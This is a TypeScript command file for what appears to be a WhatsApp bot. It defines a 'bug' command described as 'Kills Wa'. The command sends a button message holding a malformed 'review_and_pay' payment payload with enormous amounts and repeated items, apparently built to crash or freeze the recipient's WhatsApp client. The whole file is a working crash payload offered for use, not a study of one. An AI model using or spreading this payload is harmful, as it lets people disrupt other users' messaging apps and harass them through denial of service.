import { Command, BaseCommand, Message } from '../../Structures'

@Command('bug', {
    description: 'Kills Wa',
    category: 'dev',
    usage: 'bug'
})
export default class command extends BaseCommand {
    override execute = async (M: Message): Promise<void> => {
        return void (await M.sendButtonMessage({
            header: 'Test',
            body: 'Bug test',
            footer: `${this.client.config.name}© 2024`,
            buttons: [
                {
                    name: 'review_and_pay',
                    buttonParamsJson: JSON.stringify({
                        currency: 'IDR',
                        payment_configuration: '',
                        payment_type: '',
                        transaction_id: '',
                        total_amount: { value: 99999999999999900, offset: 100 },
                        reference_id: '4P5QX1JKN4Z',
                        type: 'physical-goods',
                        payment_method: '',
                        order: {
                            status: 'payment_requested',
                            description: 'test',
                            subtotal: { value: 0, offset: 100 },
                            order_type: 'PAYMENT_REQUEST',
                            items: [
                                {
                                    retailer_id: 'custom-item-bc082a34-2d16-4601-a15d-018097b92d50',
                                    name: 'test',
                                    amount: {
                                        value: 99999999999999900,
                                        offset: 100
                                    },
                                    quantity: 1
                                },
                                {
                                    retailer_id: 'custom-item-bc082a34-2d16-4601-a15d-018097b92d50',
                                    name: 'test',
                                    amount: {
                                        value: 99999999999999900,
                                        offset: 100
                                    },
                                    quantity: 1
                                },
                                {
                                    retailer_id: 'custom-item-bc082a34-2d16-4601-a15d-018097b92d50',
                                    name: 'test',
                                    amount: {
                                        value: 99999999999999900,
                                        offset: 100
                                    },
                                    quantity: 1
                                },
                                {
                                    retailer_id: 'custom-item-bc082a34-2d16-4601-a15d-018097b92d50',
                                    name: 'test',
                                    amount: {
                                        value: 99999999999999900,
                                        offset: 100
                                    },
                                    quantity: 1
                                }
                            ]
                        },
                        additional_note: 's',
                        native_payment_methods: []
                    })
                }
            ]
        }))
    }
}
